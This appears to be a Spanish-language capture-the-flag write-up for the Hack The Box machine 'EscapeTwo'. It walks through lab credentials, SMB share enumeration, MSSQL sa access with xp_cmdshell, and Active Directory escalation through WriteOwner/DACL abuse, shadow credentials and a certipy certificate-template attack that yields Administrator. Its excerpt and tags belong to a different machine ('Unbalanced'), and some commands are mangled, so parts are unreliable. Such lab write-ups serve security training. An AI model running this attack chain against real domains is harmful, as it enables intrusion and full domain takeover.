---
layout: single
title: EscapeTwo  - Hack The Box
excerpt: "To solve Unbalanced, we'll find configuration backups files in EncFS and after cracking the password and figuring out how EncFS works, we get the Squid proxy cache manager password that let us discover internal hosts. Proxying through Squid, we then land on a login page that uses Xpath to query an XML backend database. We perform Xpath injection to retrieve the password of each user, then port forward through the SSH shell to reach a Pi-Hole instance, vulnerable to a command injection vulnerability."
date: 2025-01-16
classes: wide
header:
  teaser: /assets/images/htb-writeup-unbalanced/portada.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - rsync
  - encfs
  - squid
  - xpath
  - CVE-2020-11108
  - command injection
---

![](/assets/images/portada.png)
## rose / KxEPkKe6R8su

## Portscan
nmap -Pn -sS -sC -sV -p- -T5 --max-rate 10000 -oN escape-two.txt 10.10.11.51

53/tcp    - domain       - Simple DNS Plus
  88/tcp    - kerberos-sec - Microsoft Windows Kerberos  
135/tcp   - msrpc        - Microsoft Windows RPC  
139/tcp   - netbios-ssn  - Microsoft Windows NetBIOS  
389/tcp   - ldap         - Microsoft Windows Active Directory LDAP  
445/tcp   - microsoft-ds - Posiblemente SMB  
464/tcp   - kpasswd5     - Posiblemente Kerberos  
593/tcp   - ncacn_http   - Microsoft Windows RPC over HTTP  
636/tcp   - ssl/ldap     - LDAP sobre SSL  
1433/tcp  - ms-sql-s     - Microsoft SQL Server  
3268/tcp  - ldap         - Microsoft Windows Active Directory LDAP  
3269/tcp  - ssl/ldap     - LDAP sobre SSL  
5985/tcp  - http         - Microsoft HTTPAPI (SSDP/UPnP)  
9389/tcp  - mc-nmf       - .NET Message Framing  
47001/tcp - http         - Microsoft HTTPAPI (SSDP/UPnP)  
49664-49808/tcp - msrpc - Microsoft Windows RPC (puertos dinámicos)





## Rsync & EncFS

 Bandera de usuario

Intente una enumeración básica de smb


```
poetry run python netexec.py smb 10.10.11.51 -u rose -p 'KxEPkKe6R8su' --shares                                                     main 
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.10.11.51     445    DC01             [*] Enumerated shares
SMB         10.10.11.51     445    DC01             Share           Permissions     Remark
SMB         10.10.11.51     445    DC01             -----           -----------     ------
SMB         10.10.11.51     445    DC01             Accounting Department READ            
SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.51     445    DC01             C$                              Default share
SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.11.51     445    DC01             Users           READ        
```

Mirando los catálogos, encontramos el Departamento de Contabilidad que nos interesa. Tenemos que descargarlo usando el comando y luego desempacarlo.

```
smbclient //escape.two.htb/Accounting\ Department -U Rose%KxEPkKe6R8su                                                                              130 ↵  

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jun  9 13:52:21 2024
  ..                                  D        0  Sun Jun  9 13:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 13:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 13:52:07 2024

                6367231 blocks of size 4096. 910811 blocks available

mget *
Get file accounting_2024.xlsx? y
getting file \accounting_2024.xlsx of size 10217 as accounting_2024.xlsx (25.7 KiloBytes/sec) (average 25.7 KiloBytes/sec)
Get file accounts.xlsx? y
getting file \accounts.xlsx of size 6780 as accounts.xlsx (19.8 KiloBytes/sec) (average 23.0 KiloBytes/sec)
``` 

ya depues de descargar lso 2 archivos viendo la extencion en gogle veo muachas aplicaiones para manipular el archivo

![](/assets/images/htb-writeup-unbalanced/xml.png)

La cuenta sa es la cuenta de administración predeterminada para conectar y administrar la base de datos MSSQL. Comprobar mostró que la cuenta es válida, intente utilizar mssqlclient de impacket para iniciar sesión.

![](/assets/images/htb-writeup-unbalanced/sql.png)

Genial, ahora somos sas. Por defecto, el procedimiento almacenado xp.cmdshell está desactivado en MSSQL, pero podemos habilitarlo y disfrutar de todos sus beneficios.

Asegúrese de buscar al anfitrión en busca de algo útil. Por ejemplo, tiene archivos notables para la implementación de MSSQL.

![](/assets/images/htb-writeup-unbalanced/sql1.png)

evil-winrm -i sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3'

![](/assets/images/htb-writeup-unbalanced/evil.png)

 Bandera de raíz Enlace a la partida

A continuación, considere la explotación de las listas de control de acceso discreto (DACL) utilizando el permiso de WriteOwner. El abuso del permiso de WriteOwner puede llevar a un cambio del propietario del objeto a un usuario controlado por un atacante (en este caso, ryan) y capturar el objeto.

El informe Bloodhound contribuyó a encontrar el vector.

python3 bloodyAD.py --host DC01.sequel.htb -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3'set owner ca_svc ryan

![](/assets/images/htb-writeup-unbalanced/bloo.png)


A continuación, establezca permisos FullControl para Ryan. Ahora podremos controlar el objeto de este usuario, incluida la capacidad de modificarlo y borrarlo.


```
dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'    

```
El siguiente comando certipy-ad de abusar automáticamente de la cuenta de sombra cásvc. Nos conectamos al controlador de dominio por dirección IP (-dc-ip) y utilizamos las credenciales especificadas para la autenticación.

```
certipy-ad shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -dc-ip 'DC01.sequel.htb' -ns 10.10.11.51 -target DC01.sequel.htb -account ca_svc
```

![](/assets/images/htb-writeup-unbalanced/cert.png)
```
KRB5CCNAME=ca_svc.ccachecertipy-ad find -scheme ldap -k -debug -target DC01.sequel.htb -dc-ip 10.10.11.51 -vulnerable -stdout

KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -target {host name} -dc-ip {ip}
```


![](/assets/images/htb-writeup-unbalanced/cert2.png)

Este comando crea una solicitud de certificado para la cuenta de casvc utilizando los hashess y la plantilla especificados:

certipy-ad req -u ca_svc -hashes :hashes -ca sequel-DC01-CA -target {host} -dc-ip {ip} -template DunderMifflinAuthentication -upn Administrator@{domain} -ns {ip} -dns {ip}

![](/assets/images/htb-writeup-unbalanced/cert3.png)

Ahora se trata de autenticar al usuario usando el archivo PFX que se obtuvo el paso antes:


```
certipy-ad auth -pfx {some.pfx} -dc-ip {ip}
```
![](/assets/images/htb-writeup-unbalanced/certifica.png)


Todo lo que queda es usar mal viento y un nuevo hash administrador. La bandera de raíz nos estará esperando en el escritorio.
![](/assets/images/htb-writeup-unbalanced/evil2.jpg)
